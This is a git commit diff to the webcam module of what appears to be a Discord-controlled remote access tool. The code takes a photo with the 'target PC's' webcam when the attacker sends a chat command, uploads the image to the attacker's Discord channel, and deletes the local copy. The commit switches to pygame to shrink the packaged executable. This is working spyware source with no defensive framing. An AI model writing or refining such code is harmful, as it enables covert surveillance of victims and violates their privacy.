291053c3692c5dd40f899def9dea8f7a7a8dd8ab
JuicyChann <nik.xeiladakis@gmail.com>
2023-06-23 13:55:20 +0300

    Utilize pygame instead of OpenCV for smaller exe size

--- resources/source_code/webcam.py
+++ resources/source_code/webcam.py
@@ -1,18 +1,45 @@
-from cv2 import VideoCapture, imwrite, CAP_DSHOW
+import pygame.camera
+import pygame.image
 import subprocess
+import time
 # end of imports
 
 # on message
 elif message.content[:7] == '.webcam':
     await message.delete()
     if message.content.strip() == '.webcam':
-        reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```'); await reaction_msg.add_reaction('🔴')
+        reaction_msg = await message.channel.send(
+            '```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
+        await reaction_msg.add_reaction('🔴')
     else:
         if message.content[8:] == 'photo':
-            webcam = VideoCapture(0, CAP_DSHOW)
-            result, image = webcam.read()
-            imwrite('webcam.png', image)
-            reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'), file=discord.File('webcam.png')); await reaction_msg.add_reaction('📌')
+            pygame.camera.init()
+            cameras = pygame.camera.list_cameras()
+
+            if not cameras:
+                reaction_msg = await message.channel.send('No cameras found.')
+                await reaction_msg.add_reaction('🔴')
+                return
+
+            camera = pygame.camera.Camera(cameras[0])
+            camera.start()
+            time.sleep(0.5) # let camera initialise to avoid black screen
+
+            image = camera.get_image()
+
+            camera.stop()
+
+            pygame.image.save(image, 'webcam.png')
+
+            reaction_msg = await message.channel.send(
+                embed=discord.Embed(title=current_time(True) + ' `[On demand]`')
+                .set_image(url='attachment://webcam.png'),
+                file=discord.File('webcam.png'))
+            await reaction_msg.add_reaction('📌')
+
             subprocess.run('del webcam.png', shell=True)
+
         else:
-            reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```'); await reaction_msg.add_reaction('🔴')
+            reaction_msg = await message.channel.send(
+                '```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
+            await reaction_msg.add_reaction('🔴')
